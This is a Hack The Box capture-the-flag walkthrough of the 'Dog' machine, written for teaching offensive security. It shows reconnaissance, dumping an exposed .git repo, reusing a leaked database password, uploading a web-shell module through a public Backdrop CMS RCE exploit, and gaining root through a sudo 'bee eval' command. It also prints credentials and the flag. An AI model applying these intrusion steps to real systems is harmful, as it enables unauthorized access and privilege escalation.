![https://app.hackthebox.com/machines/660](https://app.hackthebox.com/machines/651)

## ENUM

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
```

```
+ http://10.10.11.58/.git/HEAD (CODE:200|SIZE:23)       
==> DIRECTORY: http://10.10.11.58/core/                 
==> DIRECTORY: http://10.10.11.58/files/  
```

since the site was inaccessible at the time I attempted the enum, I decide to dig through the files, I find the mention of **Backdrop CMS** in [http://10.10.11.58/core/profiles/minimal/minimal.info](http://10.10.11.58/core/profiles/minimal/minimal.info):

```info
name = Minimal
description = Start with only a few modules enabled.
version = BACKDROP_VERSION
backdrop = 1.x
type = profile
hidden = TRUE

dependencies[] = node
dependencies[] = dblog
dependencies[] = layout

; Added by Backdrop CMS packaging script on 2024-03-07
project = backdrop
version = 1.27.1
timestamp = 1709862662
```

so I have this info:

Backdrop CMS : 1.27.1

I find a vuln that I could exploit once logged in:
`Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)`

I keep that aside.

I also find: [http://10.10.11.58/.git/logs/HEAD](http://10.10.11.58/.git/logs/HEAD) (I could probably reconstruct the repo!)

`root <dog@dog.htb> 1738963331 +0000	commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases`

which could also indicate a lead.

I launch ffuf (machine bug was preventing dirb from giving results)

```
ffuf -u http://10.10.11.58/FUZZ -w /usr/share/dirb/wordlists/common.txt -timeout 5 -t 10 -o result.json -of json
```

| URL                      | Code | Duration | Size | Notes                                      |
| ------------------------ | ---- | -------- | ---- | ------------------------------------------ |
| `/`                      | 200  | 63 ms    | 0    | Empty or redirected home page              |
| `/.git/HEAD`             | 200  | 68 ms    | 23   | found earlier                              |
| `/index.php`             | 200  | 65 ms    | 0    | Existing PHP file but empty                |
| `/robots.txt`            | 200  | 65 ms    | 1198 | To read, might contain hidden paths        |
| `/core/` (via `/core`)   | 301  | 78 ms    | 309  | found earlier                              |
| `/files/` (via `/files`) | 301  | 70 ms    | 310  | same                                       |
| `/layouts/`              | 301  | 58 ms    | 312  | Existing directory, redirected             |
| `/modules/`              | 301  | 59 ms    | 312  | Potentially interesting                    |
| `/sites/`                | 301  | 67 ms    | 310  | same                                       |
| `/themes/`               | 301  | 64 ms    | 311  | same                                       |
| `/.hta`                  | 403  | 57 ms    | 276  | ⚠️ Access denied (sensitive file?)         |
| `/.htpasswd`             | 403  | 53 ms    | 276  | ⚠️ Classic restriction file, access denied |
| `/server-status`         | 403  | 60 ms    | 276  | Apache status denied, good service sign    |

here’s the content of robots.txt:

```
...
Disallow: /user/register
Disallow: /user/password
Disallow: /user/login
Disallow: /user/logout
...
```

I also find a key piece of info here:
[http://10.10.11.58/files/config\_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json](http://10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json)

`"tiffany@dog.htb"` a possible username to test? but I’m missing the password, I might find it in some config files!

I’m going to download the .git and restore it:

```bash
wget --mirror -I .git http://10.10.11.58/.git/
sudo git restore .
```

and I find interesting files:

```
ls

LICENSE.txt  README.md  core  files  index.php  layouts  robots.txt  settings.php  sites  themes
```

I dig into settings.php and find several useful things:

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$settings['hash_salt'] = 'aWFvPQNGZSz1DQ701dD4lC5v1hQW34NefHvyZUzlThQ';
```

I can try the username `tiffany` and the password `BackDropJ2024DS2024`

and it works!

## INITIAL ACCESS

Now that I’m authenticated, time for the RCE vuln!

[https://www.exploit-db.com/exploits/52021](https://www.exploit-db.com/exploits/52021)

I enter the url:

```
python exploit.py http://10.10.11.58                                     
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

and I’ll upload the malicious module!

and I access it here: [http://10.10.11.58/modules/shell/shell.php](http://10.10.11.58/modules/shell/shell.php)

I can execute commands so I generate a revshell payload and gain acces to the machine.

### OWN USER

once on the machine I launch linpeas.sh:

I find 3 users:

```
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

after long analysis, I find nothing interesting so I try the password found earlier to log into the accounts

```
www-data@dog:/var/www/html/modules/shell$ su johncusack
su johncusack
Password: BackDropJ2024DS2024
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
ls
whoami
johncusack
```

and it works! I connect via ssh and relaunch linpeas.sh!

```
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

perfect! what does bee do?

```
/usr/local/bin/bee
🐝 Bee
Usage: bee [global-options] <command> [options] [arguments]
```

so we have the possibility to execute code as root!

if I look at the options that will be useful:

```
 --root
 Specify the root directory of the Backdrop installation to use. If not set, will try to find the Backdrop installation automatically based on the current directory.
```

so to specify the installation, here `/var/www/html`

```
eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

knowing that php can execute system commands, it’s perfect.

```
sudo /usr/local/bin/bee --root=/var/www/html eval "system('id');"
uid=0(root) gid=0(root) groups=0(root)
```

it’s indeed root, so now just switch to a shell:

```
johncusack@dog:/tmp$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('bash -p');"
root@dog:/var/www/html# ls /root
root.txt
root@dog:/var/www/html# cat /root/root.txt
f0a050cdb9b12eda1af7bb06b2eae6c3
```
